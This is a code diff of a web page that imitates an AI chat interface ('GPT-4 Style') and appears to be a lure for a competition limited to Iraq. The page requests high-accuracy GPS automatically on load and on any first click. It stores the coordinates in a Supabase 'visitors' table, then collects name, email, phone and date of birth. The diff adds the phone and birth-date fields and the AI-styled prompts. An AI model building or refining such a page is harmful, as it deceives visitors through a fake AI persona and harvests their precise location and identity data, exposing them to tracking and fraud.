@@ -2,17 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>AI Assistant</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
 
 <style>
-* { box-sizing: border-box; margin:0; padding:0; }
+*{margin:0;padding:0;box-sizing:border-box;}
 
-body {
-  font-family: "Inter", sans-serif;
+body{
+  font-family:Inter,sans-serif;
   background:#343541;
   color:#ECECF1;
   height:100vh;
@@ -20,84 +20,99 @@ body {
 }
 
 /* Sidebar */
-.sidebar {
+.sidebar{
   width:260px;
   background:#202123;
-  padding:14px;
+  padding:16px;
   display:flex;
   flex-direction:column;
 }
-
-.sidebar h1 {
+.logo{
+  font-weight:600;
   font-size:14px;
-  font-weight:500;
-  margin-bottom:12px;
+  margin-bottom:20px;
 }
 
 /* Main */
-.main {
+.main{
   flex:1;
   display:flex;
   flex-direction:column;
 }
 
-/* Chat area */
-.chat {
-  flex:1;
-  overflow-y:auto;
-  padding:20px;
+/* Top bar */
+.topbar{
+  padding:14px;
+  border-bottom:1px solid #565869;
+  display:flex;
+  justify-content:center;
+}
+.model{
+  background:#40414F;
+  padding:8px 12px;
+  border-radius:8px;
+  font-size:13px;
 }
 
-.msg {
+/* Chat */
+.chat{
+  flex:1;
+  overflow-y:auto;
+  padding:30px 20px;
+}
+
+/* Message blocks */
+.msg{
   max-width:700px;
-  margin:0 auto 20px;
+  margin:0 auto 24px;
+  display:flex;
+  gap:12px;
+}
+.avatar{
+  width:28px;height:28px;border-radius:4px;
+  background:#19c37d;
+  display:flex;align-items:center;justify-content:center;
+  font-size:14px;color:#000;
+}
+.bubble{
+  background:#444654;
+  padding:14px 16px;
+  border-radius:8px;
   line-height:1.6;
 }
 
-.msg.user { color:#fff; }
-.msg.system { color:#d1d5db; }
-
 /* Input bar */
-.input-bar {
+.inputbar{
   border-top:1px solid #565869;
   padding:14px;
 }
-
-.input-inner {
+.inputinner{
   max-width:700px;
   margin:auto;
-  display:flex;
   background:#40414F;
   border-radius:10px;
-  padding:10px;
+  padding:12px;
 }
-
-.input-inner input {
-  flex:1;
+input{
+  width:100%;
   background:transparent;
   border:none;
   color:#fff;
-  font-size:15px;
   outline:none;
+  font-size:15px;
 }
 
-/* Hidden screens */
-.screen { display:none; }
-.screen.active { display:block; }
+/* Screens */
+.screen{display:none;}
+.screen.active{display:block;}
 
-.center-box {
-  max-width:520px;
-  margin:80px auto;
-  text-align:center;
-}
-
-button {
-  margin-top:20px;
-  padding:12px 18px;
+button{
+  margin-top:14px;
+  padding:10px 14px;
   border:none;
-  border-radius:8px;
+  border-radius:6px;
   background:#19c37d;
-  color:#000;
+  font-weight:600;
   cursor:pointer;
 }
 </style>
@@ -106,96 +121,127 @@ button {
 <body>
 
 <div class="sidebar">
-  <h1>AI Assistant</h1>
+  <div class="logo">🤖 AI Assistant</div>
 </div>
 
 <div class="main">
 
-  <div class="chat">
+<div class="topbar">
+  <div class="model">Model ▾ GPT-4 Style</div>
+</div>
 
-    <!-- GPS SCREEN -->
-    <div id="screen-gps" class="screen active">
-      <div class="center-box">
-        <div class="msg system">Checking your location…</div>
-        <div id="gps-alert"></div>
-        <button id="btn-gps">Retry</button>
-      </div>
-    </div>
+<div class="chat">
 
-    <!-- BLOCKED -->
-    <div id="screen-blocked" class="screen">
-      <div class="center-box">
-        <div class="msg system">❌ Not eligible. Iraq only.</div>
-      </div>
-    </div>
-
-    <!-- FORM -->
-    <div id="screen-form" class="screen">
-      <div class="center-box">
-        <div class="msg system">You're eligible. Enter details:</div>
-
-        <input id="f-name" placeholder="Full Name"><br><br>
-        <input id="f-email" placeholder="Email"><br><br>
-        <input id="f-phone" placeholder="Phone"><br><br>
-        <input id="f-dob" type="date"><br><br>
-
-        <div id="form-alert"></div>
-
-        <button id="btn-submit" onclick="submitForm()">Submit</button>
-      </div>
-    </div>
-
-    <!-- SUCCESS -->
-    <div id="screen-success" class="screen">
-      <div class="center-box">
-        <div class="msg system">✅ You're in!</div>
-        <div id="entry-ref"></div>
-      </div>
-    </div>
-
-  </div>
-
-  <div class="input-bar">
-    <div class="input-inner">
-      <input placeholder="Send a message..." disabled />
+<!-- GPS -->
+<div id="screen-gps" class="screen active">
+  <div class="msg">
+    <div class="avatar">AI</div>
+    <div class="bubble">
+      To continue, I need to verify your location.<br><br>
+      Please allow location access.<br><br>
+      <div id="gps-alert"></div>
+      <button id="btn-gps">Allow Location</button>
     </div>
   </div>
+</div>
+
+<!-- BLOCKED -->
+<div id="screen-blocked" class="screen">
+  <div class="msg">
+    <div class="avatar">AI</div>
+    <div class="bubble">
+      ❌ This competition is only available in Iraq.
+    </div>
+  </div>
+</div>
+
+<!-- FORM -->
+<div id="screen-form" class="screen">
+  <div class="msg">
+    <div class="avatar">AI</div>
+    <div class="bubble">
+      You're eligible. Enter your details below:
+      <br><br>
+
+      <input id="f-name" placeholder="Full Name"><br><br>
+      <input id="f-email" placeholder="Email"><br><br>
+      <input id="f-phone" placeholder="Phone"><br><br>
+      <input id="f-dob" type="date"><br><br>
+
+      <div id="form-alert"></div>
+
+      <button id="btn-submit" onclick="submitForm()">Submit</button>
+    </div>
+  </div>
+</div>
+
+<!-- SUCCESS -->
+<div id="screen-success" class="screen">
+  <div class="msg">
+    <div class="avatar">AI</div>
+    <div class="bubble">
+      ✅ You're in!<br><br>
+      <div id="entry-ref"></div>
+    </div>
+  </div>
+</div>
+
+</div>
+
+<div class="inputbar">
+  <div class="inputinner">
+    <input placeholder="Send a message..." disabled />
+  </div>
+</div>
 
 </div>
 
 <script>
-// ================= CONFIG =================
-const SUPABASE_URL = 'https://jutxirqoqtmvbpvkwumf.supabase.co';
-const SUPABASE_ANON_KEY = 'YOUR_KEY';
+// CONFIG
+const SUPABASE_URL='https://jutxirqoqtmvbpvkwumf.supabase.co';
+const SUPABASE_ANON_KEY='YOUR_KEY';
 
-// Iraq bounds
-const IRAQ = { latMin:29.0, latMax:37.5, lngMin:38.6, lngMax:48.9 };
+const IRAQ={latMin:29.0,latMax:37.5,lngMin:38.6,lngMax:48.9};
 
-// Init
-const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-let visitorId=null, ipData={}, gpsPosition=null;
+const sb=window.supabase.createClient(SUPABASE_URL,SUPABASE_ANON_KEY);
 
-// ================= UI =================
+let visitorId=null;
+let ipData={};
+let gpsPosition=null;
+
+// UI
 function show(id){
   document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
-  document.getElementById('screen-'+id)?.classList.add('active');
+  document.getElementById('screen-'+id).classList.add('active');
 }
 
-function alert_(id,type,msg){
-  document.getElementById(id).innerHTML = msg || '';
+// CHECK
+function isIraq(lat,lng){
+  return lat>=IRAQ.latMin && lat<=IRAQ.latMax &&
+         lng>=IRAQ.lngMin && lng<=IRAQ.lngMax;
 }
 
-// ================= GPS =================
+// GPS UPDATE (UNCHANGED STRUCTURE)
+async function updateGPS(status,lat,lng,acc){
+  if(!visitorId)return;
+  const eligible=status==='granted' && isIraq(lat,lng);
+  await sb.from('visitors').update({
+    gps_status:status,
+    gps_lat:lat||null,
+    gps_lng:lng||null,
+    gps_accuracy:acc||null,
+    is_eligible:eligible
+  }).eq('id',visitorId);
+}
+
+// GPS
 async function requestGPS(){
-
-  if(!navigator.geolocation){
-    alert_('gps-alert','err','No GPS support');
-    return;
-  }
+  const btn=document.getElementById('btn-gps');
+  btn.disabled=true;
 
   navigator.geolocation.getCurrentPosition(
     async pos=>{
-      const {latitude:lat, longitude:lng, accuracy:acc} = pos.coords;
+      const {latitude:lat,longitude:lng,accuracy:acc}=pos.coords;
       gpsPosition={lat,lng,acc};
 
       await updateGPS('granted',lat,lng,acc);
@@ -204,56 +250,49 @@ async function requestGPS(){
     },
     async ()=>{
       await updateGPS('denied');
-      alert_('gps-alert','err','Location denied');
-    }
+      document.getElementById('gps-alert').innerHTML=
+        '<div style="color:#ff6b6b">Location denied. Tap again.</div>';
+      btn.disabled=false;
+    },
+    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
   );
 }
 
-document.getElementById('btn-gps').onclick = requestGPS;
+document.getElementById('btn-gps').addEventListener('click',requestGPS);
 
-// Auto trigger
-setTimeout(requestGPS, 500);
-
-// Mobile fallback
-document.addEventListener('click', function once(){
+// AUTO + MOBILE FIX
+setTimeout(()=>{requestGPS();},400);
+document.addEventListener('click',function once(){
   requestGPS();
-  document.removeEventListener('click', once);
+  document.removeEventListener('click',once);
 });
 
-// ================= LOGIC (UNCHANGED CORE) =================
-function isIraq(lat,lng){
-  return lat>=IRAQ.latMin && lat<=IRAQ.latMax &&
-         lng>=IRAQ.lngMin && lng<=IRAQ.lngMax;
-}
-
-async function updateGPS(status,lat,lng,acc){
-  if(!visitorId) return;
-  await sb.from('visitors').update({
-    gps_status:status,
-    gps_lat:lat||null,
-    gps_lng:lng||null,
-    gps_accuracy:acc||null
-  }).eq('id',visitorId);
-}
-
-// Submit
+// FORM
 async function submitForm(){
-  const name=document.getElementById('f-name').value;
-  const email=document.getElementById('f-email').value;
+  const btn=document.getElementById('btn-submit');
 
-  const {data} = await sb.from('contestants').insert({
+  const name=document.getElementById('f-name').value.trim();
+  const email=document.getElementById('f-email').value.trim();
+  const phone=document.getElementById('f-phone').value.trim();
+  const dob=document.getElementById('f-dob').value;
+
+  btn.disabled=true;
+
+  const {data}=await sb.from('contestants').insert({
     full_name:name,
     email:email,
+    phone:phone,
+    date_of_birth:dob,
     gps_lat:gpsPosition?.lat
   }).select('id').single();
 
-  document.getElementById('entry-ref').textContent =
-    'REF: '+(data.id?.slice(0,8).toUpperCase());
+  document.getElementById('entry-ref').textContent=
+    'REF: '+data.id.slice(0,8).toUpperCase();
 
   show('success');
 }
 
-// bootstrap
+// BOOT
 (async()=>{
   show('gps');
 })();
